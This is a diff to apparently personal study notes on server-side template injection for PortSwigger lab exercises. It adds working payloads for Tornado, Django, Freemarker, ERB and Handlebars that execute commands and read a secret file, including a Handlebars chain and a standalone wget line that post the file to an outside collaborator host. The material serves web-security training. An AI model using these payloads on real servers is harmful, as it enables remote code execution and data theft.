@@ -643,36 +643,109 @@ hacktricks xss cross site scripting server side xss dynamic pdf
 
 >Use the web framework native template syntax to inject a malicious payload into a **{{template}}**, which is then executed server-side.  
 
-<sub>SSTI exploit identification payloads</sub>
+>SSTI payloads to identify vulnerability.  
 
-```html
+```
+${{<%[%'"}}%\.,
+}}{{7*7}} 
+
 {{fuzzer}}
 ${fuzzer}
 ${{fuzzer}}
-
-blog-post-author-display=user.name}}{{7*7}} 
 
 ${7*7}
 <%= 7*7 %>
 ${{7*7}}
 #{7*7}
 ${foobar}
-${{<%[%'"}}%\.
+
 {% debug %}
-
-{% SkippyPeanut %}
-```
-
-```python
-{% import os %}
-{{os.system('wget http://colab.net --post-file=/home/carlos/secret')
 ```  
 
-```html
-blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('wget%20http://colab.net%20--post-file=/home/carlos/secret')
+![Identify SSTI](identify-ssti.png)  
+
+>Tornado Template  
+
 ```
+}}
+{% import os %}
+{{os.system('cat /home/carlos/secret')
+
+blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('cat%20/home/carlos/secret')
+```  
+
+![Tornado Template](tornado-template.png)  
 
 [PortSwigger Lab: Basic server-side template injection data exfiltrate](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)  
+
+>Django Template  
+
+```
+${{<%[%'"}}%\,
+{% debug %} 
+{{settings.SECRET_KEY}}
+```  
+
+![Django template](django-template.png)  
+
+[PortSwigger Lab: Server-side template injection with information disclosure via user-supplied objects](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)  
+
+>Freemarker Template  
+
+```
+${foobar}
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /home/carlos/secret") }
+```  
+
+![Freemarker template](freemarker-template.png)  
+
+[PortSwigger Lab: Server-side template injection using documentation](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)  
+
+
+>ERB Template  
+
+```
+<%= 7*7 %>
+<%= system("cat /home/carlos/secret") %>
+```  
+
+![ERB template](erb-template.png)  
+
+[PortSwigger Lab: Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)  
+
+
+>Handlebars Template  
+
+```
+${{<%[%'"}}%\,
+```  
+
+```
+wrtz{{#with "s" as |string|}}
+    {{#with "e"}}
+        {{#with split as |conslist|}}
+            {{this.pop}}
+            {{this.push (lookup string.sub "constructor")}}
+            {{this.pop}}
+            {{#with string.split as |codelist|}}
+                {{this.pop}}
+                {{this.push "return require('child_process').exec('wget http://ext.burpcollab.net --post-file=/home/carlos/secret');"}}
+                {{this.pop}}
+                {{#each conslist}}
+                    {{#with (string.sub.apply 0 codelist)}}
+                        {{this}}
+                    {{/with}}
+                {{/each}}
+            {{/with}}
+        {{/with}}
+    {{/with}}
+{{/with}}
+```
+
+![Handlebars template](handlebars-template.png)  
+
+[PortSwigger Lab: Server-side template injection in an unknown language](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)  
+
 
 >Random notes on template injections  
 
@@ -685,10 +758,11 @@ POST request newemail parameter
 portswigger.net/research/server-side-template-injection
 {{7*7}}
 portswigger.net/research/template-injection
+
+wget http://ext.burpcollab.net --post-file=/home/carlos/secret
 ```  
 
-<sup> SSTI Section incomplete ...need more input...</sup>  
-
+<sup> SSTI Section ...need more input...</sup>  
 
 ## ProtoType Pollution  
 
